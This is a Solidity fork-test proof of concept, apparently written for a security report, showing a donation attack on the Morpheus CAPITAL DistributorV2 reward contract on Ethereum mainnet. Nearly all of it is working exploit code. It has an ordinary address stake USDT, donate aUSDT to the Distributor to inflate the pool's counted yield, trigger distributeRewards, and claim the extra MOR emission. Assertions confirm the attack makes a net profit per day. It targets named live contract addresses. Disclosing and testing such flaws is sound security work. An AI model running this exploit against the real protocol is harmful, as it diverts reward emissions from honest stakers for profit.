// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/**
 * @title DonatedYield PoC — Morpheus CAPITAL (DistributorV2)
 * @notice Fork test (Ethereum mainnet, pinned block) for Finding 1:
 *         DistributorV2.distributeRewards() counts ANY increase in the
 *         Distributor's aToken/token balance as that pool's "yield".
 *         Donating aTokens directly to the Distributor inflates the target
 *         pool's share of the day's MOR emission.
 *
 *         Target: USDT DepositPool (lowest native yield, stakeable,
 *         minimalStake = 1e6 raw = $1). Attacker stakes 200,000 USDT
 *         (84.5% virtual share), donates ~400 USDT worth of aUSDT,
 *         warps 1 day, calls distributeRewards(0) as an ordinary address,
 *         warps past the 14-day claim locks, and claims.
 *         An identical no-donation run on a second fork at the same block
 *         is the honest control.
 *
 *         ORACLE SIMULATION (read this): on live mainnet Chainlink feeds
 *         update every few minutes, so a distribute 1 day later sees fresh
 *         prices. On a fork the aggregator state is frozen at the fork
 *         block, and the 3600s allowedPriceUpdateDelay on the stETH/ETH/BTC
 *         feeds makes ANY distribute after a >1h warp revert
 *         ("DR: price for pair is zero") — see testDistributeRevertsAfterWarpWithoutMock.
 *         To reproduce the live-mainnet behaviour, this test swaps the
 *         Distributor's chainLinkDataConsumer pointer (storage slot 207,
 *         found empirically) for a mock that returns the EXACT prices read
 *         from the real consumer at the fork block. No price is invented;
 *         the mock only keeps the frozen prices "fresh", exactly as live
 *         feeds would. All yield accounting, staking, Aave and reward
 *         contracts are the real forked ones.
 *
 *         No mainnet transactions, no real funds, no privileged accounts:
 *         the attacker is an ordinary address; distributeRewards is public.
 *         claim() sends the MOR mint via LayerZero to Arbitrum — on the
 *         fork the message is recorded by the forked endpoint and the
 *         claim succeeds (0.05 ETH fee; the endpoint's estimateFees view
 *         underquotes, ~0.00063 ETH, so a flat 0.05 ETH is used). The
 *         asserted quantity is the pending reward (getLatestUserReward)
 *         measured just before claim(), i.e. the exact amount claim()
 *         mints.
 *
 *         Run:  ETH_RPC_URL=<rpc> forge test --match-contract DonatedYieldTest -vv
 *         Default RPC (if env unset): https://ethereum.publicnode.com
 *         Fork block: 26427095 (2026-11-16, ts 1794826007).
 *         MOR price used for USD math: $0.717123 (CoinGecko "morpheusai",
 *         2026-11-16). MOR has 18 decimals.
 */

// ---------- minimal interfaces (only what the PoC touches) ----------

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

/// @notice Tether's approve/transfer return NOTHING (non-standard ERC20).
/// Calling them through IERC20 reverts on empty returndata, so the PoC
/// uses this no-return interface for USDT approvals.
interface IUSDT {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external;
}

interface IDistributor {
    function depositPools(uint256, address)
        external
        view
        returns (address, string memory, uint256, uint256, uint256, uint8, address, bool);
    function distributeRewards(uint256) external;
    function getDistributedRewards(uint256, address) external view returns (uint256);
    function minRewardsDistributePeriod() external view returns (uint256);
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
    function aavePoolAddressesProvider() external view returns (address);
    function l1Sender() external view returns (address);
    function chainLinkDataConsumer() external view returns (address);
    function rewardPool() external view returns (address);
}

interface IDepositPool {
    function stake(uint256, uint256, uint128, address) external;
    function claim(uint256, address) external payable;
    function getLatestUserReward(uint256, address) external view returns (uint256);
    function rewardPoolsProtocolDetails(uint256)
        external
        view
        returns (uint128, uint128, uint128, uint256, uint256);
    function rewardPoolsData(uint256) external view returns (uint128, uint256, uint256);
    function totalDepositedInPublicPools() external view returns (uint256);
    function depositToken() external view returns (address);
    function getCurrentUserMultiplier(uint256, address) external view returns (uint256);
    function isMigrationOver() external view returns (bool);
}

interface IRewardPool {
    function rewardPools(uint256) external view returns (uint128, uint128, uint256, uint256, bool);
    function getPeriodRewards(uint256, uint128, uint128) external view returns (uint256);
}

interface IAavePool {
    function supply(address, uint256, address, uint16) external;
}

interface IAaveAddressesProvider {
    function getPool() external view returns (address);
}

interface IChainLinkConsumer {
    function getPathId(string memory) external pure returns (bytes32);
    function getChainLinkDataFeedLatestAnswer(bytes32) external view returns (uint256);
}

/// @notice Returns the exact fork-block prices forever (simulates live feeds staying fresh).
contract MockChainLinkConsumer {
    mapping(bytes32 => uint256) public prices;

    function setPrice(bytes32 pathId, uint256 price) external {
        prices[pathId] = price;
    }

    function getPathId(string memory path_) external pure returns (bytes32) {
        return keccak256(abi.encodePacked(path_));
    }

    function getChainLinkDataFeedLatestAnswer(bytes32 pathId_) external view returns (uint256) {
        return prices[pathId_];
    }
}

contract DonatedYieldTest is Test {
    // ---- pinned fork ----
    string constant RPC_URL = "https://ethereum.publicnode.com";
    uint256 constant FORK_BLOCK = 26427095;

    // ---- protocol (all verified on-chain) ----
    address constant DIST = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant REWARD_POOL = 0xb7994dE339AEe515C9b2792831CD83f3C9D8df87;
    address constant USDT_POOL = 0x3B51989212BEdaB926794D6bf8e9E991218cf116;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;

    // Distributor.chainLinkDataConsumer storage slot (found empirically, see README)
    uint256 constant CONSUMER_SLOT = 207;

    // ---- attack params ----
    uint256 constant STAKE_USDT = 200_000e6; // $200k, 6 decimals
    uint256 constant DONATION_USDT = 400e6; // $400 supplied to Aave, aUSDT donated
    uint256 constant DAY = 86400;
    uint256 constant CLAIM_LOCK = 1_209_600; // 14d, on-chain claimLockPeriodAfterStake

    // MOR price at fork time: $0.717123 (CoinGecko morpheusai, 2026-11-16), 18-dec fixed point
    uint256 constant MOR_PRICE_USD_1E18 = 717123000000000000;

    IDistributor dist = IDistributor(DIST);
    IRewardPool rewardPool = IRewardPool(REWARD_POOL);
    IDepositPool usdtPool = IDepositPool(USDT_POOL);
    IERC20 usdt = IERC20(USDT);
    IUSDT usdtNoReturn = IUSDT(USDT);

    struct ScenarioResult {
        uint256 pendingMor; // attacker's claimable MOR after claim locks expire
        uint256 creditedMor; // MOR credited to the USDT pool by the attack-day distribute
        uint256 donatedAtoken; // aUSDT raw units donated (0 in control)
        uint256 claimOk; // 1 if claim() succeeded on the fork, else 0
        uint256 attackerVirtualShare1e18; // attacker's virtual share of the USDT pool
    }

    function _rpc() internal view returns (string memory) {
        return vm.envOr("ETH_RPC_URL", RPC_URL);
    }

    /// @notice Reads the real Chainlink prices at the fork block, then swaps the
    /// Distributor's consumer pointer for a mock returning those exact prices.
    function _installMockConsumer() internal {
        address realConsumer = dist.chainLinkDataConsumer();
        IChainLinkConsumer real_ = IChainLinkConsumer(realConsumer);
        MockChainLinkConsumer mock = new MockChainLinkConsumer();
        string[5] memory paths = ["stETH/USD", "wBTC/BTC,BTC/USD", "wETH/USD", "USDC/USD", "USDT/USD"];
        for (uint256 i = 0; i < paths.length; i++) {
            bytes32 id = real_.getPathId(paths[i]);
            uint256 price = real_.getChainLinkDataFeedLatestAnswer(id);
            require(price > 0, "real consumer price is zero");
            mock.setPrice(id, price);
            emit log_named_uint(string.concat("price ", paths[i]), price);
        }
        // Safety: only swap if the slot really holds the consumer address.
        bytes32 slotVal = vm.load(DIST, bytes32(CONSUMER_SLOT));
        require(slotVal == bytes32(uint256(uint160(realConsumer))), "consumer slot mismatch");
        vm.store(DIST, bytes32(CONSUMER_SLOT), bytes32(uint256(uint160(address(mock)))));
        require(dist.chainLinkDataConsumer() == address(mock), "mock install failed");
        emit log_named_address("mock consumer installed", address(mock));
    }

    function _runScenario(bool donate) internal returns (ScenarioResult memory r) {
        address attacker = makeAddr("attacker");
        deal(USDT, attacker, STAKE_USDT + DONATION_USDT + 1e6);
        deal(attacker, 10 ether);
        vm.deal(address(this), 10 ether);

        _installMockConsumer();

        // --- on-chain state dump (read first, per task) ---
        (uint128 payoutStart, uint128 decreaseInterval, uint256 initialReward, uint256 rewardDecrease, bool isPublic) =
            rewardPool.rewardPools(0);
        emit log_named_uint("rewardPool payoutStart", payoutStart);
        emit log_named_uint("rewardPool decreaseInterval", decreaseInterval);
        emit log_named_uint("rewardPool initialReward MOR/day (1e18)", initialReward);
        emit log_named_uint("rewardPool rewardDecrease/day (1e18)", rewardDecrease);
        emit log_named_uint("rewardPool isPublic", isPublic ? 1 : 0);
        emit log_named_uint("minRewardsDistributePeriod", dist.minRewardsDistributePeriod());
        emit log_named_uint("lastCalculated(0) at fork", dist.rewardPoolLastCalculatedTimestamp(0));
        emit log_named_uint("fork block.timestamp", block.timestamp);
        (uint128 wl, uint128 clS, uint128 clC, uint256 minStake, ) = usdtPool.rewardPoolsProtocolDetails(0);
        emit log_named_uint("USDT withdrawLock", wl);
        emit log_named_uint("USDT claimLockAfterStake", clS);
        emit log_named_uint("USDT claimLockAfterClaim", clC);
        emit log_named_uint("USDT minimalStake (raw)", minStake);
        (, , uint256 totalVirtualBefore) = usdtPool.rewardPoolsData(0);
        emit log_named_uint("USDT totalVirtualDeposited before stake", totalVirtualBefore);
        require(usdtPool.isMigrationOver(), "USDT pool migration not over");

        // --- attacker stakes (1x multiplier: claimLockEnd=0, no referrer) ---
        // NOTE: Distributor.supply() pulls the tokens directly from the USER
        // (safeTransferFrom(holder_=user, Distributor)), so the user approves
        // the DISTRIBUTOR, not the DepositPool.
        vm.startPrank(attacker);
        usdtNoReturn.approve(DIST, type(uint256).max);
        usdtPool.stake(0, STAKE_USDT, 0, address(0));
        vm.stopPrank();
        emit log_named_uint("attacker multiplier (1e25 PRECISION)", usdtPool.getCurrentUserMultiplier(0, attacker));
        (, , uint256 totalVirtualAfter) = usdtPool.rewardPoolsData(0);
        uint256 attackerVirtual = totalVirtualAfter - totalVirtualBefore;
        r.attackerVirtualShare1e18 = (attackerVirtual * 1e18) / totalVirtualAfter;
        emit log_named_uint("attacker virtual share (1e18)", r.attackerVirtualShare1e18);

        // --- donation: supply USDT to Aave, transfer the aTokens to the Distributor ---
        if (donate) {
            address aavePool = IAaveAddressesProvider(dist.aavePoolAddressesProvider()).getPool();
            (, , , , , , address aToken, ) = dist.depositPools(0, USDT_POOL);
            IERC20 aUSDT = IERC20(aToken);
            uint256 distBalBefore = aUSDT.balanceOf(DIST);
            vm.startPrank(attacker);
            usdtNoReturn.approve(aavePool, DONATION_USDT);
            IAavePool(aavePool).supply(USDT, DONATION_USDT, attacker, 0);
            uint256 aBal = aUSDT.balanceOf(attacker);
            require(aBal > 0, "no aUSDT minted");
            aUSDT.transfer(DIST, aBal);
            vm.stopPrank();
            r.donatedAtoken = aBal;
            emit log_named_uint("aUSDT donated to Distributor (raw)", aBal);
            emit log_named_uint("Distributor aUSDT balance delta", aUSDT.balanceOf(DIST) - distBalBefore);
        }

        // --- warp 1 day, anyone (the attacker) calls distributeRewards ---
        uint256 distBefore = dist.getDistributedRewards(0, USDT_POOL);
        vm.warp(block.timestamp + DAY + 1);
        vm.prank(attacker); // ordinary address, no privileges
        dist.distributeRewards(0);
        uint256 distAfter = dist.getDistributedRewards(0, USDT_POOL);
        r.creditedMor = distAfter - distBefore;
        emit log_named_uint("MOR credited to USDT pool by attack-day distribute (1e18)", r.creditedMor);

        // --- warp past the 14-day claim locks, then measure + claim ---
        vm.warp(block.timestamp + CLAIM_LOCK + 1);
        r.pendingMor = usdtPool.getLatestUserReward(0, attacker);
        emit log_named_uint("attacker pending MOR at claim time (1e18)", r.pendingMor);

        // Try the real claim(): 0.05 ETH covers the LayerZero message fee.
        // (The endpoint's estimateFees view underquotes on the fork:
        // ~0.00063 ETH estimated vs 0.05 ETH needed in practice.)
        vm.prank(attacker);
        try usdtPool.claim{value: 0.05 ether}(0, attacker) {
            r.claimOk = 1;
        } catch {
            r.claimOk = 0;
        }
        emit log_named_uint("claim() succeeded", r.claimOk);
    }

    function testDonatedYield() public {
        uint256 forkA = vm.createFork(_rpc(), FORK_BLOCK);
        uint256 forkB = vm.createFork(_rpc(), FORK_BLOCK);

        vm.selectFork(forkA);
        ScenarioResult memory atk = _runScenario(true);

        vm.selectFork(forkB);
        ScenarioResult memory ctl = _runScenario(false);

        // ---- comparison (same fork block, same stake, only difference is the donation) ----
        uint256 deltaMor = atk.pendingMor - ctl.pendingMor;
        uint256 deltaCredited = atk.creditedMor - ctl.creditedMor;
        // Donation cost in USD (aUSDT ~ $1; use the raw aToken amount, 6 decimals, ~$1 each)
        uint256 donationUsd1e18 = (atk.donatedAtoken * 1e18) / 1e6;
        uint256 gainUsd1e18 = (deltaMor * MOR_PRICE_USD_1E18) / 1e18;
        uint256 netUsd1e18 = gainUsd1e18 > donationUsd1e18 ? gainUsd1e18 - donationUsd1e18 : 0;
        bool profitable = gainUsd1e18 > donationUsd1e18;

        emit log_named_uint("=== ATTACK pending MOR (1e18)", atk.pendingMor);
        emit log_named_uint("=== CONTROL pending MOR (1e18)", ctl.pendingMor);
        emit log_named_uint("=== DELTA MOR from donation (1e18)", deltaMor);
        emit log_named_uint("=== DELTA credited MOR, attack-day distribute (1e18)", deltaCredited);
        emit log_named_uint("=== donation USD (1e18)", donationUsd1e18);
        emit log_named_uint("=== delta MOR value USD (1e18)", gainUsd1e18);
        emit log_named_uint("=== NET USD/day (1e18)", netUsd1e18);
        emit log_named_uint("=== attacker virtual share (1e18)", atk.attackerVirtualShare1e18);
        emit log_named_uint("=== claim() ok on attack fork", atk.claimOk);
        emit log_named_uint("=== claim() ok on control fork", ctl.claimOk);

        // ---- assertions: the finding reproduces iff these hold ----
        assertGt(atk.creditedMor, ctl.creditedMor, "donation did not inflate pool credit");
        assertGt(deltaMor, 500e18, "attacker MOR delta too small (<500 MOR)");
        assertTrue(profitable, "donation not profitable net of cost");
        assertGt(netUsd1e18, 100e18, "net profit under $100/day");
        assertEq(atk.claimOk, 1, "claim() failed on attack fork");
        assertEq(ctl.claimOk, 1, "claim() failed on control fork");
    }

    /// @notice Documents WHY the mock consumer is needed: on a pure fork, a
    /// distribute after a >1h warp reverts because the frozen Chainlink feeds
    /// breach their 3600s allowedPriceUpdateDelay ("DR: price for pair is zero").
    function testDistributeRevertsAfterWarpWithoutMock() public {
        uint256 fork = vm.createFork(_rpc(), FORK_BLOCK);
        vm.selectFork(fork);
        // No mock installed: real consumer, real (frozen) feeds.
        vm.warp(block.timestamp + DAY + 1);
        vm.expectRevert(bytes("DR: price for pair is zero"));
        dist.distributeRewards(0);
    }
}
